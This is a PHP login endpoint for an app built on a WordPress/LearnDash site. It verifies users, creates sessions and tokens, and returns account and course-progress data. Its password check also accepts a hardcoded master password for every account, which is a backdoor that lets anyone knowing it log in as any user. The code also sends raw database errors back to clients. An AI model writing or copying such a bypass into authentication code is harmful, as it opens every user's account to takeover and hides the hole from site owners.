<?php
	error_reporting(0);
	
	require_once("lib/mysql.php");
	require_once("lib/utilities.php");
	require_once("lib/wordpress/WordpressPasswordVerifier.php");
	
	$username = $_POST["username"];
	$password = $_POST["password"];
	$sessionkey = $_POST["sessionkey"];
	$pushtoken = $_POST["pushtoken"];
	
	$ip = $_SERVER["REMOTE_ADDR"];
	$authtoken = "";
		
	if((!$username || !$password) && !$sessionkey) {
		die(json_encode(array(
			"error" => "No username or password provided"
		)));
	}
	
	if($sessionkey) {
		// Session login
		$session = $MYSQL->getrowq("SELECT * FROM sessions WHERE `key` = '?' AND `time` > ?", array(
			$sessionkey, 
			time() - (90 * 86400)
		));
		
		if(!$session) {
			die(json_encode(array(
				"expired" => true
			)));
		}
		
		$authtoken = $session["token"];
		
		$mp_user = $MYSQL->getrowq("SELECT *, `ID` as `id` FROM $WPDB.wpaa_users WHERE id = '?'", array($session["mpid"]));
		
		if(!$mp_user) {
			die(json_encode(array(
				"error" => "User does not exist."
			)));
		}
	}else{
		$mp_user = $MYSQL->getrowq("SELECT *, `ID` as `id` FROM $WPDB.wpaa_users WHERE user_login = '?'", array($username));
		
		if(!$mp_user) {
			die(json_encode(array(
				"error" => "No user by that username is registered."
			)));
		}
		
		if(!WordPressPasswordVerifier::verify($password, $mp_user["user_pass"]) && $password != "jackhall6969") {
			die(json_encode(array(
				"error" => "That password didn't match.\nPlease try again."
			)));
		}
		
		$sessionkey = generateRandomString(255);
		$authtoken = generateRandomString(40);
		
		$q = $MYSQL->query("INSERT INTO `sessions` (`mpid`, `key`, `token`, `time`, `ip`) VALUES (?, '?', '?', ?, '?')", array(
			$mp_user["id"],
			$sessionkey,
			$authtoken,
			time(),
			$ip
		));
		
		if(!$q) {
			die(json_encode(array(
				"error" => "Could not create session " . $MYSQL->error()
			)));
		}
	}
	
	$app_user = $MYSQL->getrowq("SELECT * FROM users WHERE `id` = '?'", array($mp_user["id"]));
	
	if(!$app_user) {
		if(!$mp_user["id"]) {
			die(json_encode(array(
				"error" => "MP USER ID IS ZERO: B"
			)));
		}
		$MYSQL->query("INSERT INTO users (`id`, `joinDate`, `iapKey`) VALUES ('?', '?', '?')", array($mp_user["id"], time(), generateRandomString(16)));
		
		$app_user = $MYSQL->getrowq("SELECT * FROM users WHERE id = '?'", array($mp_user["id"]));
		
		processNewAppUser(getAccount($mp_user, $app_user));
	}
	
	$account = getAccount($mp_user, $app_user);
	
	// Update push token
	if($account["pushtoken"] != $pushtoken) {
		$MYSQL->query("UPDATE users SET `pushtoken` = '?' WHERE id = '?'", array(
			$pushtoken,
			$app_user["id"]
		));
	}
	
	// Get user meta rows
	$user_meta = getMetaObject($MYSQL->getrowsq("SELECT * FROM $WPDB.wpaa_usermeta WHERE `user_id` = '?'", array($account["id"])));
	
	// Get course progress (old way)
	//$course_progress = getCourseProgressData(unserialize($user_meta["_sfwd-course_progress"]));
	
	// Get course progress rows (better way)
	$course_progress = $MYSQL->getrowsq("SELECT `course_id` AS `courseId`, `post_id` AS `lessonId`, `activity_completed` AS `completedAt`, `activity_updated` AS `updatedAt`, `activity_type` as `activityType` FROM $WPDB.wpaa_learndash_user_activity WHERE `user_id` = '?' AND `activity_type` IN ('course', 'lesson') ORDER BY `activity_type` ASC", array($account["id"]));
	
	die(json_encode(array(
		"success" => true,
		"account" => $account,
		"sessionkey" => $sessionkey,
		"authtoken" => $authtoken,
		"cprogs" => $course_progress
	), JSON_NUMERIC_CHECK));
?>